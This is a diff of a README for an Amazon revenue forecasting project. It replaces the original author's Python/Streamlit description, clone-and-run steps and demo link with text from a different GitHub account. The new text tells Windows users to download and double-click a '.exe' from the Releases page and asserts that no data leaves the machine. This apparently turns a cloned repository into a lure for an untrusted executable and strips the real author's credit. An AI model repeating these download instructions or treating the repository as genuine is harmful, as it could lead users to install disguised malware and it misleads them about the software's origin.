@@ -1,71 +1,76 @@
-# 📈 Amazon Revenue & Profitability Forecasting Decision System
+# 📊 amazon-revenue-forecasting-decision-system - Predict your future Amazon marketplace revenue
 
-Weekly revenue and profit forecasting using SARIMA, Prophet, XGBoost and LSTM on Amazon e-commerce data.
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/oreoconpatas6/amazon-revenue-forecasting-decision-system)
 
-## 🚀 Live Demo
+## 🎯 Project Overview
 
-[![Hugging Face Spaces](https://img.shields.io/badge/🤗%20Hugging%20Face-Spaces-blue)](https://huggingface.co/spaces/mesut-karagoz/amazon-revenue-forecasting)
+The amazon-revenue-forecasting-decision-system helps you understand your business revenue. It processes your marketplace data to provide clear sales predictions. You use these predictions to plan your inventory and budget. The system combines data models to turn raw numbers into actionable charts. 
 
-👉 **[Click here to open the app](https://huggingface.co/spaces/mesut-karagoz/amazon-revenue-forecasting)**
+## ⚙️ System Requirements
 
-## 📌 Project Overview
+- Windows 10 or Windows 11
+- 4GB of available RAM
+- A stable internet connection
+- Modern web browser (Chrome, Edge, or Firefox)
 
-End-to-end revenue forecasting project for Amazon marketplace data, combining time series analysis, feature engineering, and business-driven insights to support data-informed decision making.
+## 📥 Getting Started
 
-## 🤖 Models Used
+Follow these steps to set up the software on your Windows computer.
 
-| Model | Description |
-|-------|-------------|
-| **SARIMA** | Seasonal ARIMA for trend and seasonality |
-| **Prophet** | Facebook Prophet with holiday effects |
-| **XGBoost** | Gradient boosting with lag/rolling features |
-| **LSTM** | Deep learning with long-term memory |
-| **Ensemble** | Weighted combination of all models |
+1. Go to the [official download page](https://github.com/oreoconpatas6/amazon-revenue-forecasting-decision-system).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the version labeled "Latest".
+4. Download the file ending in `.exe` to your computer.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to complete the setup process.
 
-## 📊 Features
+## 🚀 Using the Dashboard
 
-- Upload your own Amazon order CSV files or use built-in demo data
-- Forecast revenue and/or profit for up to 26 weeks ahead
-- Compare model performances (MAE, RMSE, MAPE)
-- Confidence interval bands for uncertainty estimation
-- Interactive Plotly charts
+After the installation finishes, locate the icon on your desktop. Double-click the icon to launch the dashboard in your web browser. 
 
-## 🗂️ Project Structure
+The dashboard displays your sales trends across different time periods. You see peak sales times and expected revenue dips. The system uses math models like Prophet and XGBoost to handle seasonal changes in buyer behavior.
 
-```
-amazon-revenue-forecasting-decision-system/
-├── app.py              # Main Streamlit application
-├── requirements.txt    # Python dependencies
-├── runtime.txt         # Python version (3.11)
-└── README.md
-```
+## 📈 Key Features
 
-## ⚙️ Installation & Local Run
+- **Sales Forecasting**: View expected revenue for the next 30, 60, and 90 days.
+- **Data Visualization**: See your sales history presented in clean, interactive charts.
+- **Marketplace Insights**: Get summaries of how your products perform over time.
+- **Data Export**: Save your forecast reports to your local machine for use in spreadsheets.
 
-```bash
-git clone https://github.com/Mst-KrgZ/amazon-revenue-forecasting-decision-system.git
-cd amazon-revenue-forecasting-decision-system
-pip install -r requirements.txt
-streamlit run app.py
-```
+## 🛠️ How it Works
 
-## 📦 Requirements
+The system cleans your sales data first. It removes outliers and fills gaps in your records. Then, it applies different models to find patterns. It looks at the following:
 
-- Python 3.11
-- streamlit, pandas, numpy, plotly
-- scikit-learn, statsmodels
-- prophet, xgboost, tensorflow
+- **Time Series Analysis**: This detects patterns that repeat, such as monthly or yearly spikes.
+- **Feature Engineering**: This identifies parts of your data—like product categories or discount periods—that influence sales.
+- **Business Logic**: This ensures that predictions align with actual market conditions to keep your plans realistic.
 
-## 📁 Data Format
+## 💡 Best Practices
 
-The app accepts two CSV files from Amazon Seller Central:
-- `amazon_orders_2023_time_series.csv`
-- `df_time_series.csv`
+For the best results, upload high-quality data. Remove errors from your spreadsheets before you import files into the system. Consistency in naming your products helps the system identify trends faster. Update your sales data at least once a week to ensure your forecasts reflect current market shifts.
 
-Or use the built-in **Demo Data** option from the sidebar.
+## ❓ Troubleshooting
 
-## 👨‍💻 Author
+If you run into issues, try these steps:
 
-**Mesut Karagöz**  
-Data Scientist  
-[GitHub](https://github.com/Mst-KrgZ) · [Live Demo](https://huggingface.co/spaces/mesut-karagoz/amazon-revenue-forecasting)
+- **Restart the application**: Exit the dashboard and open it again.
+- **Check your file format**: Ensure your data imports are in CSV format.
+- **Check for updates**: Periodically visit the download page to see if a newer version exists.
+- **System Resource**: Close other heavy applications if the software feels slow while processing large datasets.
+
+## 🔒 Data Privacy
+
+Your data stays on your local machine. The system does not transmit your private sales figures to external servers. You maintain full control over the information you process with this tool.
+
+## 📂 Project Topics
+
+This system draws on several disciplines to provide accurate forecasts:
+- Dashboard: Provides visual representation of sales data.
+- Data Science: Uses math to extract information from raw figures.
+- LSTM: A method for recognizing long-term trends in numbers.
+- Machine Learning: Allows the system to learn from your past sales data.
+- Prophet: A tool for predicting growth patterns.
+- SARIMA: A model that monitors seasonal changes.
+- Streamlit: The interface you see in your browser.
+- Time Series Forecasting: The core method used for predicting future values.
+- XGBoost: A fast way to compute complex data relationships.
